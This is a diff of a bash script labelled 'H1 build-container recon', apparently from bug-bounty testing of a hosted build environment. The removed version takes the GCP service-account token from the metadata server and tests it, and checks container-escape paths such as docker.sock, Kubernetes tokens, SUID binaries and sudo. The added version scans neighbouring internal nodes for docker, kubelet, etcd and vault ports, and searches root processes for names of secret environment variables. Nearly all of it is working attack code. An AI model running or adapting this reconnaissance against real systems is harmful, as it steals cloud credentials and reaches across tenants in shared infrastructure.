@@ -1,87 +1,87 @@
 #!/usr/bin/env bash
-# H1 build-container recon v7 — the untested invited targets: GCP metadata (orchestration/SA token),
-# container-escape primitives (caps/docker.sock/k8s-sa/suid/mounts), and node internal port-scan.
-# RoE explicitly INVITES: root priv-esc, secrets NOT accessible to my user, container escape, orchestration plane.
-# STRICT HYGIENE: read-only, minimum-proof. A live GCP/K8s token is NEVER written to the public output —
-# only its length + sha256[:16] + token_type + expires_in + SCOPES (scopes prove impact w/o exposing the cred).
-# Researcher: abedalaziz123sayed. Low-and-slow. No cross-tenant data consumed.
+# H1 build-container recon v8 — the two live threads after v7 (metadata/caps/docker/k8s all HARDENED):
+#  (1) LOCAL listeners: what does the root build-agent (uid=0, same netns) LISTEN on that buildbot can reach?
+#  (2) FLAT-NETWORK / cross-node reachability: v7 reached a DIFFERENT node's :4317 — can I reach neighbor
+#      build nodes' orchestration ports (=> cross-tenant / orchestration-plane)? LIGHT scan (few IPs, few ports).
+# RoE-invited (orchestration plane / cross-user secrets). Read-only, metadata-only, low-and-slow, no DoS.
+# Researcher: abedalaziz123sayed.
 set +e
-PUB="public/recon7.txt"; mkdir -p public; : > "$PUB"
+PUB="public/recon8.txt"; mkdir -p public; : > "$PUB"
 p(){ echo "$*" >> "$PUB"; }
-p "=====RECON7 START====="
-p "id=$(id)  node=$HOST_NODE_IP  ip=$(hostname -I 2>/dev/null)"
+p "=====RECON8 START====="
+NODE=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
+MYIP=$(hostname -I 2>/dev/null | awk '{print $1}')
+p "id=$(id) myip=$MYIP node(gw)=$NODE HOST_NODE_IP=$HOST_NODE_IP"
 
-# ---------- 1) GCP metadata server (THE orchestration/secret escalation) ----------
-p ""
-p "## GCP metadata reachability (metadata.google.internal / 169.254.169.254):"
-for HOST in metadata.google.internal 169.254.169.254; do
-  code=$(curl -s -o /dev/null -w '%{http_code}' -m4 -H "Metadata-Flavor: Google" "http://$HOST/computeMetadata/v1/" 2>/dev/null)
-  p "  $HOST/computeMetadata/v1/ -> HTTP $code"
-done
-p "  project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null | head -c120)"
-p "  numeric-project-id: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id 2>/dev/null | head -c60)"
-p "  instance/zone: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone 2>/dev/null | head -c120)"
-p "  instance/name: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/name 2>/dev/null | head -c80)"
-p "  SA list: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | tr '\n' ',' | head -c200)"
-p "  default SA email: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 2>/dev/null | head -c120)"
-p "  default SA scopes: $(curl -s -m4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes 2>/dev/null | tr '\n' ',' | head -c400)"
-# token: PROVE acquisition WITHOUT exposing the live credential
+# (1) LOCAL LISTEN sockets (root build-agent control ports in my netns) from /proc/net/tcp + tcp6
 python3 - <<'PY' >> "$PUB"
-import urllib.request, json, hashlib
-try:
-    req=urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-                               headers={"Metadata-Flavor":"Google"})
-    r=urllib.request.urlopen(req, timeout=4); d=json.load(r)
-    tok=d.get("access_token","")
-    print("  SA TOKEN OBTAINED: len=%d sha256[:16]=%s type=%s expires_in=%s" % (
-        len(tok), hashlib.sha256(tok.encode()).hexdigest()[:16], d.get("token_type"), d.get("expires_in")))
-    # prove the token is USABLE (impact) by calling tokeninfo — returns scopes+email, NOT secret data
-    import urllib.parse
-    ti=urllib.request.urlopen("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token="+urllib.parse.quote(tok), timeout=5)
-    tj=json.load(ti)
-    print("  TOKENINFO: scope=%s email=%s aud=%s expires_in=%s" % (tj.get("scope"), tj.get("email"), tj.get("audience"), tj.get("expires_in")))
-except Exception as e:
-    print("  SA TOKEN: FAIL %r" % (str(e)[:160],))
+import struct
+def dec(a):
+    h,pt=a.split(':'); b=struct.pack('<I',int(h,16))
+    return f'{b[0]}.{b[1]}.{b[2]}.{b[3]}',int(pt,16)
+print("## LOCAL LISTEN sockets (state=0A) — who listens in my netns:")
+seen=set()
+for fn in ('/proc/net/tcp','/proc/net/tcp6'):
+    try:
+        for ln in open(fn).read().splitlines()[1:]:
+            f=ln.split()
+            if f[3]!='0A': continue
+            try:
+                if fn.endswith('6'):
+                    ip='[v6]'; port=int(f[1].split(':')[1],16)
+                else:
+                    ip,port=dec(f[1])
+            except: continue
+            uid=f[7]
+            key=(ip,port)
+            if key in seen: continue
+            seen.add(key)
+            print(f"  LISTEN {ip}:{port} uid={uid}")
+    except Exception as e: print("  err",fn,e)
 PY
 
-# ---------- 2) container-escape primitives ----------
-p ""
-p "## container-escape primitives:"
-p "  caps(self): $(grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status 2>/dev/null | tr '\n' ' ')"
-p "  /proc/1/cgroup: $(cat /proc/1/cgroup 2>/dev/null | tr '\n' '|' | head -c240)"
-p "  docker.sock: $(ls -la /var/run/docker.sock 2>&1 | head -c120)"
-p "  containerd.sock: $(ls -la /run/containerd/containerd.sock 2>&1 | head -c120)"
-p "  k8s SA token dir: $(ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | tr '\n' ',' | head -c240)"
-p "  /run/secrets: $(ls -la /run/secrets/ 2>&1 | tr '\n' ',' | head -c200)"
-p "  suid binaries: $(find / -perm -4000 -type f 2>/dev/null | head -20 | tr '\n' ',')"
-p "  sudo -n: $(sudo -n true 2>&1 | head -c80; echo " rc=$?")"
-p "  writable root paths(sample): $(find /etc /usr/local/bin -writable -type f 2>/dev/null | head -8 | tr '\n' ',')"
-p "  mounts(sensitive): $(mount 2>/dev/null | grep -iE 'secret|docker|/proc/|/sys/fs' | head -8 | tr '\n' '|' | head -c300)"
-p "  env(NON-secret keys only): $(env 2>/dev/null | cut -d= -f1 | grep -iE 'NETLIFY|AWS|GCP|GOOGLE|K8S|KUBE|TOKEN|SECRET|VAULT|CONSUL|NOMAD' | tr '\n' ',' | head -c300)"
+# probe each non-loopback LISTEN port locally as buildbot (can we talk to the build-agent's control port?)
+p "## probe local listeners (http banner, first 120b):"
+for PORT in 80 443 2375 6443 8080 8125 9090 9100 4317 50051 8000 3000 5000 7000 9000 9200; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' -m2 "http://127.0.0.1:$PORT/" 2>/dev/null)
+  [ "$code" != "000" ] && p "  127.0.0.1:$PORT http=$code"
+done
 
-# ---------- 3) node internal port-scan (172.16.7.1) — orchestration services ----------
-p ""
-p "## node 172.16.7.1 internal port-scan (orchestration surface):"
+# (2) cross-node reachability — neighbor build-node gateways (172.16.X.1) on orchestration ports. LIGHT.
 python3 - <<'PY' >> "$PUB"
 import socket
-node="172.16.7.1"
-ports={22:"ssh",80:"http",443:"https",2375:"docker",2376:"docker-tls",6443:"k8s-api",8443:"k8s-alt",
-10250:"kubelet",10255:"kubelet-ro",2379:"etcd",8500:"consul",4646:"nomad",8200:"vault",
-9092:"kafka",4317:"otlp",8080:"http-alt",9090:"prom",50051:"grpc",3000:"grafana",6379:"redis"}
-for pt,nm in sorted(ports.items()):
-    s=socket.socket(); s.settimeout(2)
-    try:
-        s.connect((node,pt)); print(f"  {node}:{pt} ({nm}) OPEN"); s.close()
-    except Exception:
-        pass
-print("  (only OPEN ports listed)")
+# a handful of neighbor /24 gateways + the known other node from v6
+nodes=["172.16.0.1","172.16.1.1","172.16.4.1","172.16.5.1","172.16.6.1","172.16.7.1","172.16.8.1"]
+ports={22:"ssh",2375:"docker",2376:"docker-tls",6443:"k8s",10250:"kubelet",2379:"etcd",
+       8500:"consul",4646:"nomad",8200:"vault",9092:"kafka",4317:"otlp",50051:"grpc",8080:"http-alt"}
+print("## cross-node reachability (neighbor build-node gateways, single-connect):")
+for nd in nodes:
+    open_p=[]
+    for pt,nm in ports.items():
+        s=socket.socket(); s.settimeout(1)
+        try:
+            s.connect((nd,pt)); open_p.append(f"{pt}({nm})"); s.close()
+        except Exception: pass
+    if open_p: print(f"  {nd}: OPEN {', '.join(open_p)}")
+print("  (only nodes with OPEN ports listed)")
 PY
 
-# ---------- 4) kubelet read-only API if reachable (10255) — pod list = cross-tenant ----------
-p ""
-p "## kubelet/k8s api quick probe:"
-p "  10255/pods: $(curl -s -o /dev/null -w '%{http_code}' -m3 http://172.16.7.1:10255/pods 2>/dev/null)"
-p "  10250/pods(https): $(curl -sk -o /dev/null -w '%{http_code}' -m3 https://172.16.7.1:10250/pods 2>/dev/null)"
+# (3) OTLP gateway deeper — is my node's :4317 a collector w/ a query/debug side? (gRPC reflection is complex; try http paths)
+p "## OTLP :4317 on my node ($NODE) http paths:"
+for pth in / /v1/traces /v1/metrics /debug/pprof/ /metrics; do
+  p "  $pth -> $(curl -s -o /dev/null -w '%{http_code}' -m2 http://$NODE:4317$pth 2>/dev/null)"
+done
 
-p "=====RECON7 END====="
+# (4) build-agent process & its open files (secrets?) — /proc scan for root procs readable by buildbot
+p "## root procs visible + any world-readable cmdline/environ:"
+for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -40); do
+  owner=$(stat -c '%u' /proc/$pid 2>/dev/null)
+  if [ "$owner" = "0" ]; then
+    cmd=$(tr '\0' ' ' </proc/$pid/cmdline 2>/dev/null | head -c100)
+    envr=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|CRED|PASS' | cut -d= -f1 | tr '\n' ',' | head -c120)
+    [ -n "$cmd" ] && p "  pid=$pid root cmd=[$cmd] readable_secret_env_keys=[$envr]"
+  fi
+done
+
+p "=====RECON8 END====="
 cat "$PUB"
